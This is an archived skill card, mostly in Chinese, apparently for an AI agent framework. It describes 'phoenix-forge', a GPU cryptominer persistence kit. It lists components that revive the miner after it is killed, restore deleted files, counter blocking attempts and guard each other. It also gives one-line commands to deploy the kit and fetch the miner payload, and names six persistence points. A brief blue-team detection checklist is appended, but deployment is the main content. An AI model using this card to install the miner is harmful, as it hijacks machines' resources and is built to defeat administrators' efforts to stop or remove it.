<!-- archived from /root/.hermes/skills/security/phoenix-forge/SKILL.md on 2026-10-21 -->

---
name: phoenix-forge
description: "Use when deploying or hunting GPU-miner persistence kits (phoenix-forge / fguard family)."
---

> 归档卡：原目录 `/root/.hermes/skills/security/phoenix-forge`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/phoenix-forge/…')`，不要相对 `references/legacy/` 解析。

# Phoenix Forge — GPU 矿机持久化熔炉（fguard 套件）

**适用**: 授权主机上的矿机驻留部署（红队）；同族检出与清除（蓝队）。
与 venom-root / venom-hydra / immortal-pact / undying-persist 同源家族——本包 = 部署工具链（8/8 压测通过版）。

## 组件
| 组件 | 作用 |
|---|---|
| fguard-watchdog | 主守护：进程/文件监控，掉线拉起 |
| fguard-reviver | 复活器：被 kill 后重拉 |
| fguard-heal | 自愈：文件被删/改后恢复 |
| fguard-autoban | 反制：检测围堵/封禁行为并反制 |
| fguard-killswitch | 开关：一键停/启（主人级控制） |
| fguard-peer | 互保：多实例互盯 |
| fguard-recon | 侦察：环境/对手探测 |
| fguard-anchor | 锚定：初始持久化落点 |

## 部署（kit/ 内）
```bash
bash kit/forge-deploy.sh        # 一键盘踞（fguard 全组件 + 持久化点）
bash kit/forge-get-miner.sh     # 拉矿机载荷（kit/config/miner.env.tpl 配池地址）
```
持久化点（kit/templates/）: cron.persist · cron.watch · cron.heal · unit.service(systemd) · rc.local · profile.d —— 六路铺开。

## 蓝队检出清单
- cron ×3(persist/watch/heal) + systemd unit + rc.local + profile.d，六路全查
- 进程名/路径特征: `fguard-*`；配套矿机二进制特征
- 行为特征: 删除后自动重现（自愈）——发现"删不掉的进程/文件"即活体 fguard

## 来源
2026-10 phoenix_forge_v1 本地包（融合版，8/8 回归通过）；原始部署说明见 kit/README.md。
